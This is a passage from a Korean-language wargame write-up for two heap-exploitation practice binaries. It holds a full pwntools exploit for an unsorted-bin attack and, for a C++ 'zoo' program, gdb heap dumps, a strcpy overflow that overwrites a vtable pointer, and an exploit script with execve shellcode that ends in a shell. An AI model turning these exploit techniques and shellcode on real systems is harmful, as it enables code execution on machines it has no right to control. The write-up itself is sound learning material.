그리고 다시 같은 크기로 malloc을 할당해 주면 magic안에 main_arena+88이 들어가게 된다. 그 후 4869를 입력해 주면 된다.

```python
from pwn import * 

t = process('./magicheap')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def a(a,b):
	r(":")
	s("1")
	r(":")
	s(str(a))
	r(":")
	s(str(b))

def ed(a,b,c):
	r(":")
	s("2")
	r(":")
	s(str(a))
	r(":")
	s(str(b))
	r(":")
	s(str(c))

def d(a):
	r(":")
	s("3")
	r(":")
	s(str(a))

a(0x20,"a")
a(0x100,"a")
a(0x20,"a")

d(1)

ed(0,0x100,"a"*0x20 + p64(0) + p64(0x111) + p64(0) + p64(0x00000000006020C0 - 0x10))
a(0x100,"b")
r(":")
s("4869")
t.interactive()

Congrt !
cat: /home/magicheap/flag: 그런 파일이나 디렉터리가 없습니다
```

local....

<br>

# LAB 15

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  int v4; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  std::operator<<<std::char_traits<char>>(&std::cout, "Name of Your zoo :");
  read(0, &nameofzoo, 0x64uLL);
  while ( 1 )
  {
    menu();
    std::operator<<<std::char_traits<char>>(&std::cout, "Your choice :");
    std::istream::operator>>(&edata, &v4);
    std::ostream::operator<<(&std::cout, &std::endl<char,std::char_traits<char>>);
    switch ( v4 )
    {
      case 1:
        adddog();
        break;
      case 2:
        addcat();
        break;
      case 3:
        listen();
        break;
      case 4:
        showinfo();
        break;
      case 5:
        remove();
        break;
      case 6:
        _exit(0);
        return;
      default:
        v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Invaild choice");
        std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
        break;
    }
  }
}
```

오 씨피피다.. 

```cpp
unsigned __int64 adddog(void)
{
  __int64 v0; // rbx
  unsigned int v2; // [rsp+Ch] [rbp-74h]
  __int64 v3; // [rsp+10h] [rbp-70h]
  __int64 v4; // [rsp+18h] [rbp-68h]
  char v5; // [rsp+20h] [rbp-60h]
  char v6; // [rsp+40h] [rbp-40h]
  unsigned __int64 v7; // [rsp+68h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v5);
  std::operator<<<std::char_traits<char>>(&std::cout, "Name : ");
  std::operator>><char,std::char_traits<char>,std::allocator<char>>(&edata, &v5);
  std::operator<<<std::char_traits<char>>(&std::cout, "Weight : ");
  std::istream::operator>>(&edata, &v2);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v6, &v5);
  v0 = operator new(0x28uLL);
  Dog::Dog(v0, &v6, v2);
  v4 = v0;
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v6);
  v3 = v4;
  std::vector<Animal *,std::allocator<Animal *>>::push_back(&animallist, &v3);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v5);
  return __readfsqword(0x28u) ^ v7;
}
```

add_dog() 솔직히 잘 모르겠다.. cpp를 한번도 안해봤기 때문에.. 일단 malloc이 된다는 것은 알 수 있음(dog class로 객체 생성? 하는거 같다)

```cpp
unsigned __int64 listen(void)
{
  __int64 v0; // rax
  unsigned __int64 v1; // rbx
  __int64 v2; // rax
  _QWORD *v3; // rax
  unsigned int v5; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v6; // [rsp+8h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  if ( std::vector<Animal *,std::allocator<Animal *>>::size(&animallist) == 0 )
  {
    v0 = std::operator<<<std::char_traits<char>>(&std::cout, "no any animal!");
    std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  }
  else
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "index of animal : ");
    std::istream::operator>>(&edata, &v5);
    v1 = v5;
    if ( v1 >= std::vector<Animal *,std::allocator<Animal *>>::size(&animallist) )
    {
      v2 = std::operator<<<std::char_traits<char>>(&std::cout, "out of bound !");
      std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
    }
    else
    {
      v3 = (_QWORD *)std::vector<Animal *,std::allocator<Animal *>>::operator[](&animallist, v5);
      (**(void (__fastcall ***)(_QWORD))*v3)(*v3);
    }
  }
  return __readfsqword(0x28u) ^ v6;
}
```

listen()인데 주의깊게 봐야할 게 add, listen이다 일단 nx가 꺼져 있어서 쉘코드를 사용할 수 있는데 listen에서 무엇인가를 굉장한 포인터와 함께 실행해주기 때문에 아마 저게 익스 벡터겠지 하지만 능력 부족으로 아이다로 볼 수 없어 직접 코드로...

```cpp
class Dog : public Animal{
	public :
		Dog(string str,int w){
			strcpy(name,str.c_str());
			weight = w ;
		}
		virtual void speak(){
			cout << "Wow ~ Wow ~ Wow ~" << endl ;
		}
		virtual void info(){
			cout << "|---------------------|" << endl ;
			cout << "| Animal info         |" << endl;
			cout << "|---------------------|" << endl;
			cout << "  Weight :" << this->weight << endl ;
			cout << "  Name : " << this->name << endl ;
			cout << "|---------------------|" << endl;
		}
};

void listen(){
	unsigned int idx ;
	if(animallist.size() == 0){
		cout << "no any animal!" << endl ;
		return ;
	}
	cout << "index of animal : ";
	cin >> idx ;
	if(idx >= animallist.size()){
		cout << "out of bound !" << endl;
		return ;
	}
	animallist[idx]->speak();

}

아이다에서도 0000000000403140 off_403140      dq offset _ZN3Dog5speakEv 이렇게 확인할 수 있는데 아마 vtable같은 녀석 아닐까
```

이렇게 2개의 주요.. 코드를 보자 일단 virtual void speak()라는 걸로 보면 heap에 포인터가 생길거 같고 strcpy가 있기 때문에 어떻게든 악용가능할 것 같다. 

```c
addr                prev                size                 status              fd                bk
0x1c08000           0x0                 0x11c10              Used                None              None
0x1c19c10           0x0                 0x30                 Used                None              None
0x1c19c40           0x10                0x20                 Freed                0x0              None
0x1c19c60           0x0                 0x30                 Used                None              None
0x1c19c90           0x20                0x20                 Used                None              None

gdb-peda$ x/50gx 0x1c19c10
0x1c19c10:	0x0000000000000000	0x0000000000000031
0x1c19c20:	0x0000000000403140	0x0000000000000061
0x1c19c30:	0x0000000000000000	0x0000000000000000
0x1c19c40:	0x0000000000000010	0x0000000000000021
0x1c19c50:	0x0000000000000000	0x0000000000000000
0x1c19c60:	0x0000000000000000	0x0000000000000031
0x1c19c70:	0x0000000000403140	0x0000000000000062
0x1c19c80:	0x0000000000000000	0x0000000000000000
0x1c19c90:	0x0000000000000020	0x0000000000000021
0x1c19ca0:	0x0000000001c19c20	0x0000000001c19c70
0x1c19cb0:	0x0000000000000000	0x0000000000020351

0x605490 <animallist>:	0x0000000001c19ca0	0x0000000001c19cb0
0x6054a0 <animallist+16>:	0x0000000001c19cb0	0x0000000000000000

gdb-peda$ x/gx 0x0000000001c19ca0
0x1c19ca0:	0x0000000001c19c20
```

개를 두마리 넣고나면 이렇게 할당이 되는데 저 맨위에 저녀석은 뭔지 모르겠고.. 왜 할당이 이렇게 되는지 저녀석은 free되어 있는지 모르겠다 ㅠㅠ 하지만 예상한대로 heap에 포인터들이 들어있다 그리고 speak()가 시작되는 동물리스트 전역변수에도 포인터가 박혀있는데 1c19ca0 -> 1c19c20 -> 0x403140 -> ~~ 이런식으로 굉장히 많은 포인터를 타고 들어간다. 그래서 아무리봐도 저 0x403140을 어떻게든 변조하면 될건데.. 할당할 때 값을 많이 넣어버리면 계속 죽거나 쭉 아래로만 덮여서 할 수가 없었다..

```c
gdb-peda$ x/50gx 0x1682c10
0x1682c10:	0x0000000000000000	0x0000000000000031
0x1682c20:	0x0000000000403140	0x0000000000000061
0x1682c30:	0x0000000000000000	0x0000000000000000
0x1682c40:	0x0000000000000010	0x0000000000000021
0x1682c50:	0x0000000000000000	0x0000000000000000
0x1682c60:	0x0000000000000000	0x0000000000000031
0x1682c70:	0x0000000000403140	0x6363636363636363
0x1682c80:	0x6363636363636363	0x6363636363636363
0x1682c90:	0x6363636300000030	0x6363636363636363
0x1682ca0:	0x6363636363636363	0x0000000001682c70
0x1682cb0:	0x6363636363636363	0x6363636363636363
0x1682cc0:	0x6363636363636363	0x6363636363636363
0x1682cd0:	0x6363636363636363	0x6363630063636363
0x1682ce0:	0x6363636363636363	0x6363636363636363
0x1682cf0:	0x6363636363636363	0x0000000063636363

Dog(string str,int w){
    strcpy(name,str.c_str());
    weight = w ;
}
```

많은 짓 중에 1 chunk free하고 재할당 할 때 많이 넣어봤더니 이런식으로 덮여지는 걸 겨우 발견했다 아마 위의 strcpy 때문 아닐까!

근데 저 아래 포인터 0x6363636363636363	0x0000000001682c70 이녀석을 변조하려고 했었는데 아니 c가 들어가면 안죽는데 저 쪽에 namezoo 전역변수를 쓰면 계속 죽어버렸다.. (왤까...)

```c
gdb-peda$ x/50gx 0x13d7c10
0x13d7c10:	0x0000000000000000	0x0000000000000031
0x13d7c20:	0x0000000000403140	0x6363636363636363
0x13d7c30:	0x6363636363636363	0x6363636363636363
0x13d7c40:	0x6363636300000030	0x6363636363636363
0x13d7c50:	0x6363636363636363	0x6363636363636363
0x13d7c60:	0x6363636363636363	0x6363636363636363
0x13d7c70:	0x6363636363636363	0x6363636363636363
0x13d7c80:	0x6363636363636363	0x0000000063636363
0x13d7c90:	0x0000000000000020	0x0000000000000021
0x13d7ca0:	0x00000000013d7c70	0x00000000013d7c20
```

캬 0 chunk free -> malloc() input c*100

```cpp
std::operator<<<std::char_traits<char>>(&std::cout, "Name of Your zoo :");
read(0, &nameofzoo, 0x64uLL);
```

아주 좋은 전역변수가 존재한다! 

```python
from pwn import * 

t = process('./zoo')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def dog(a,b):
	r(":")
	s("1")
	r(":")
	s(str(a))
	r(":")
	s(str(b))

def lis(a):
	r(":")
	s("3")
	r(":")
	s(str(a))

def show(a):
	r(":")
	s("4")
	r(":")
	s(str(a))

def d(a):
	r(":")
	s("5")
	r(":")
	s(str(a))

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
zoo = 0x0000000000605420

r(":")
s(sc + p64(zoo))

dog("a",0x10)
dog("b",0x20)
d(0)
dog("c"*72 + p64(zoo + len(sc)),0x30)
lis(0)
t.interactive()
```

실행해보면

```c
0x1d21c10:	0x0000000000000000	0x0000000000000031
0x1d21c20:	0x0000000000403140	0x6363636363636363
0x1d21c30:	0x6363636363636363	0x6363636363636363
0x1d21c40:	0x6363636300000030	0x6363636363636363
0x1d21c50:	0x6363636363636363	0x6363636363636363
0x1d21c60:	0x6363636363636363	0x6363636363636363
0x1d21c70:	0x000000000060543b	0x0000000000000062
0x1d21c80:	0x0000000000000000	0x0000000000000000
0x1d21c90:	0x0000000000000020	0x0000000000000021
0x1d21ca0:	0x0000000001d21c70	0x0000000001d21c20

0x605490 <animallist> : 0x1d21ca0 -> 0x1d21c70 -> 0x60543b -> 0x605420 -> 0x605420 <nameofzoo>:	0x91969dd1bb48c031	0x53dbf748ff978cd0
			 0xb05e545752995f54	 0x0000605420050f3b

   0x4018a2 <listen()+182>:	mov    rdx,QWORD PTR [rax]
   0x4018a5 <listen()+185>:	mov    rdx,QWORD PTR [rdx]
   0x4018a8 <listen()+188>:	mov    rdi,rax
=> 0x4018ab <listen()+191>:	call   rdx
   0x4018ad <listen()+193>:	mov    rax,QWORD PTR [rbp-0x18]
   0x4018b1 <listen()+197>:	xor    rax,QWORD PTR fs:0x28
   0x4018ba <listen()+206>:	je     0x4018c1 <listen()+213>
   0x4018bc <listen()+208>:	call   0x4010d0 <__stack_chk_fail@plt>
Guessed arguments:
arg[0]: 0x2561c70 --> 0x60543b --> 0x605420 --> 0x91969dd1bb48c031
```

하앟 이렇게 셀코드에 접근..할 수 있다!

```c
$ id
uid=1000(bskim)
```

add_dog를 전혀 알 수가 없으니... 풀긴 풀었는데 푼거 같지않다.. cpp 좀 공부해야겠다..

